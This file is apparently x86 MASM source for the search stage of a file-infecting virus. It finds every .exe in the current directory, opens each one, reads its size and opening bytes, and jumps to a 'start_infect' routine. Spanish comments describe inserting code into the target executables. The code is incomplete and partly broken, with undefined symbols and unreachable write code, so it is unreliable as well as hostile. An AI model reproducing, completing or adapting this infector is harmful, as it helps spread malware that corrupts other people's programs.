ifndef SEARCH_FILES_ASM_
SEARCH_FILES_ASM_ MACRO
ENDM

jmp start_search

.data
errorMsgCaption db "Error!", 0
errorMsgText db "Error finding first file!", 0
errorMsgText2 db "Error opening file!", 0
errorMsgText3 db "Error seeking file!", 0
errorMsgText4 db "Error telling file size!", 0
errorMsgText5 db "Error reading the file!", 0
errorMsgText6 db "Error writing into the file!", 0
mode db "rb", 0
file_regex_sf db "*.exe", 0
buffer_db db 256 dup(0)
format_db db "File size: %d", 0
msgCaption_db db "File Info", 0
filebuffer db 460 dup(0)

.data?

filesearchhandle_sf dd ?
filehandle_sf dd ?
filesize_sf dd ?
fileptr_sf dd ?
bytesRead dd ?
win32finddata_sf WIN32_FIND_DATA <>

.code

start_search:
    invoke FindFirstFileA, addr file_regex_sf, addr win32finddata
    cmp eax, INVALID_HANDLE_VALUE
    je findfirstfile_failed
    mov filesearchhandle_sf, eax

search_exe_loop:
    invoke MessageBoxA, NULL, addr win32finddata.cFileName, addr msgCaption_db, MB_OK
    
    invoke crt_fopen, addr win32finddata.cFileName, addr mode
    mov filehandle_sf, eax
    cmp filehandle_sf, 0
    je open_failed

    invoke crt_fseek, filehandle_sf, 0, 2 ; SEEK_END is 2
    cmp eax, 0
    jne fseek_failed

    invoke crt_ftell, filehandle_sf
    cmp eax, -1
    je ftell_failed

    mov filesize_sf, eax
    invoke wsprintf, addr buffer_db, addr format_db, filesize_sf
    invoke MessageBoxA, NULL, addr buffer_db, addr msgCaption_db, MB_OK

    add eax, 5000h
    invoke VirtualAlloc, 0, eax, MEM_COMMIT, PAGE_READWRITE
    mov fileptr_sf, eax
    cmp eax, 0
    je syserr

    invoke crt_fseek, filehandle_sf, 0, 0 ; SEEK_SET is 0
    cmp eax, 0
    jne fseek_failed
    mov filesize_sf,sizeof filebuffer
    ; Leer el archivo usando crt_fgets
     
     invoke crt_fread, addr filebuffer, 1, sizeof filebuffer, filehandle_sf
    mov bytesRead, eax
    ;invoke crt_fgets, addr filebuffer, addr filesize_sf, filehandle_sf
    cmp eax, 0
    je syserr

    invoke MessageBoxA, NULL, addr filebuffer, addr msgCaption_db, MB_OK
    
  
    ; Insertar código en el archivo
     lea  esi, filebuffer   
     
   
    ;invoke infect_file;, fileptr_sf, filesize_sf ; Procedimiento para inyectar código en el archivo de interés. Devuelve el nuevo tamaño del archivo.
    mov  filesize_sf, eax
   
  jmp start_infect

    invoke crt_fseek, filehandle_sf, 0, 0 ; SEEK_BEGIN es 0
    cmp eax, 0
    jne fseek_failed
    je syserr

    invoke crt_fwrite, addr fileptr_sf, 1, filesize_sf - 1, filehandle_sf
    cmp eax, filesize_sf - 1
    jne error_writing_file

    invoke MessageBox, NULL, addr msgText, addr msgCaption_db, MB_OK
    invoke CloseHandle, filehandle_sf
    invoke VirtualFree, fileptr_sf, 0, MEM_RELEASE
    
    ; Buscar el siguiente archivo
    jmp find_next

open_failed:
    invoke MessageBox, NULL, addr errorMsgText2, addr errorMsgCaption, MB_OK
    jmp find_next

fseek_failed:
    invoke MessageBox, 0, addr errorMsgText3, addr msgCaption_db, MB_OK
    invoke ExitProcess, 2

ftell_failed:
    invoke MessageBox, 0, addr errorMsgText4, addr msgCaption_db, MB_OK
    invoke ExitProcess, 3

syserr:
    invoke MessageBox, NULL, addr errorMsgText5, addr errorMsgCaption, MB_OK
    jmp search_exe_loop

error_writing_file:
    invoke MessageBox, 0, addr errorMsgText6, addr msgCaption_db, MB_OK
    invoke crt_fclose, filehandle_sf
    invoke ExitProcess, 1

find_next:
    invoke FindNextFileA, filesearchhandle_sf, addr win32finddata_sf
    cmp eax, 0
    je exit_search_exe
    jmp search_exe_loop

findfirstfile_failed:
    invoke MessageBoxA, NULL, addr errorMsgText, addr errorMsgCaption, MB_OK
    jmp search_exe_loop

exit_search_exe:
    invoke FindClose, filesearchhandle_sf
    invoke ExitProcess, 0

endif                           ; SEARCH_FILES_ASM_